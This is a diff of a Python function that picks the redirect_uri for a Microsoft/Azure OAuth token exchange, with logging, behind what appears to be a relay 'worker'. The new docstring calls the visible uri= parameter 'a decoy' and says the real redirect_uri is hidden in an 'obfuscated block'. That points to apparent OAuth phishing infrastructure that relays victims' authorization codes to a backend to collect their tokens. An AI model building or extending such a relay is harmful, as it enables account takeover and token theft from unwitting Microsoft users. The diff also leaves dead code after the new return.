@@ -675,31 +675,29 @@ def resolve_token_exchange_redirect_uri(
     """
     Resolves the correct redirect_uri for the token exchange POST.
 
-    Must exactly match what was registered in Azure and used
-    in the original authorize request.
+    KEY INSIGHT from sample URL analysis:
+    The real redirect_uri is hidden inside the obfuscated block
+    and is always REDIRECT_URI (the direct backend callback URL).
 
-    Since the worker redirect_uri is now a fixed base URL
-    with no nonce path, we only need relay_host to reconstruct it.
-    relay_path is ignored — the nonce path is no longer used
-    as part of the registered redirect_uri.
+    The uri= visible param is a decoy showing the worker URL.
+    Microsoft does NOT use uri= as the redirect_uri.
+    Microsoft uses the redirect_uri from inside the obfuscated block.
 
-    If relay_host is present:
-      redirect_uri = https://{relay_host}
-    If relay_host is not present:
-      redirect_uri = REDIRECT_URI (direct backend callback)
+    Therefore the token exchange must always use REDIRECT_URI
+    regardless of whether the request came via worker relay or direct.
+
+    relay_host is logged for debugging but not used to build the URI.
     """
-    if relay_host:
-        # Fixed base URL — no nonce path
-        # Matches exactly what is registered in Azure
-        worker_redirect_uri = f"https://{relay_host}"
-        print(
-            f"[auth] resolve_token_exchange_redirect_uri\n"
-            f"  source=worker_relay\n"
-            f"  relay_host={relay_host}\n"
-            f"  resolved_redirect_uri={worker_redirect_uri}"
-        )
-        return worker_redirect_uri
-
+    print(
+        f"[auth] resolve_token_exchange_redirect_uri\n"
+        f"  relay_host={relay_host}\n"
+        f"  relay_path={relay_path}\n"
+        f"  resolved_redirect_uri={REDIRECT_URI}\n"
+        f"  reason=real redirect_uri is always backend URL"
+        f" hidden inside obfuscated block"
+    )
+    return REDIRECT_URI
+    
     print(
         f"[auth] resolve_token_exchange_redirect_uri\n"
         f"  source=direct\n"
